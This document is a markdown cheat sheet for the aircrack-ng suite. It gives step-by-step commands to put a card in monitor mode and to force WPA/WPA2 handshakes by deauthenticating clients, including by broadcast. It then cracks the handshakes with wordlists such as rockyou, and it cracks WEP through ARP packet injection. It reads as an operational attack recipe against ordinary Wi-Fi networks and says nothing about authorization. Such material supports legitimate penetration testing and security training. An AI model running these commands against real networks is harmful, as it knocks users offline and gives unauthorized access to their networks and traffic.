
## 🧰 Key Tools in the Suite

| Tool          | Purpose                         |
| ------------- | ------------------------------- |
| `airmon-ng`   | Enable/disable monitor mode     |
| `airodump-ng` | Capture packets & handshakes    |
| `aireplay-ng` | Packet injection (e.g., deauth) |
| `aircrack-ng` | Crack captured handshakes       |
| `airbase-ng`  | Fake AP                         |
| `airdecap-ng` | Decrypt WEP/WPA pcap files      |

---

## 🚀 Setup & Monitor Mode

### List Interfaces
```
iwconfig
```


## Kill Conflicting Processes
```
sudo airmon-ng check kill
```

## 📡 Capture Handshake (WPA/WPA2)

1. Start Monitoring
```
sudo airmon-ng start wlan0
```

2. Discover Networks
```
sudo airodump-ng wlan0mon
```
Note BSSID (MAC), channel (CH), and ESSID (name).

3. Targeted Capture
```
sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon
```

4. Deauth Client to Force Handshake
```
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

If no specific client, use broadcast:
```
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

## 🔓 Crack Handshake (WPA/WPA2)
```
aircrack-ng -w wordlist.txt -b <BSSID> capture.cap
```

- `-w`: Wordlist file
    
- `-b`: BSSID
    
- `.cap`: Handshake file (from airodump)

## 🔑 Crack WEP

1. Capture IVs
```
airodump-ng --bssid <BSSID> -c <CH> -w wep-dump wlan0mon
```

2. Inject ARP Packets
```
aireplay-ng -3 -b <BSSID> -h <Your_MAC> wlan0mon
```

3. Crack WEP Key
```
aircrack-ng wep-dump.cap
```

## 📂 Output Files

|File|Description|
|---|---|
|`.cap`|Packet capture|
|`.csv`|CSV log of networks|
|`.kismet.csv`|Compatible with Kismet|
|`.netxml`|XML network data|
## 🛠 Pro Tips

- Use `--ivs` to speed up cracking (WEP)
    
- Use large wordlists for WPA/WPA2 (e.g., rockyou.txt)
    
- Combine with `hashcat` for GPU-accelerated cracking
    
- Monitor power level with `iwconfig` or `airmon-ng`

## 📚 Wordlists

- Default: `/usr/share/wordlists/rockyou.txt.gz`
    
- Custom: Use `crunch`, `cewl`, or download from:
    
    - [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

## 📦 Extra Tools

|Tool|Use|
|---|---|
|`airgraph-ng`|Visualize captures|
|`airolib-ng`|WPA pre-computed tables|
|`packetforge-ng`|Create custom packets|
|`wifi-honey`|Fake AP for honeypots|






















































